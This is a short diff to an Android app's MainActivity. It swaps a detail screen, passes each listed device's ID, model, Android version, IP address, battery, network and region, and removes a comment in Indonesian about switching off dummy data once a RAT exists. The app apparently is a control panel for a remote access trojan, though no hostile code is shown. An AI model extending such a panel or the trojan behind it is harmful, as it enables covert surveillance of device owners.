@@ -2,7 +2,6 @@ package com.testapp;
 
 import android.app.Activity;
 import android.content.Intent;
-import android.content.SharedPreferences;
 import android.os.Bundle;
 import android.os.Handler;
 import android.view.Gravity;
@@ -20,8 +19,7 @@ public class MainActivity extends Activity {
     private Socket socket;
     private TextView statusText;
     private LinearLayout deviceContainer;
-    private Handler handler = new Handler();
-    private boolean useDummy = true; // Ganti ke false jika sudah ada RAT
+    private boolean useDummy = true;
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
@@ -232,11 +230,14 @@ public class MainActivity extends Activity {
             scale.setRepeatCount(0);
             v.startAnimation(scale);
 
-            Intent i = new Intent(MainActivity.this, ControlActivity.class);
+            Intent i = new Intent(MainActivity.this, DeviceDetailActivity.class);
             i.putExtra("deviceId", data[0]);
             i.putExtra("deviceModel", data[1]);
+            i.putExtra("android", data[2]);
+            i.putExtra("ip", data[3]);
             i.putExtra("battery", data[5]);
             i.putExtra("network", data[6]);
+            i.putExtra("region", data[7]);
             startActivity(i);
         });
 
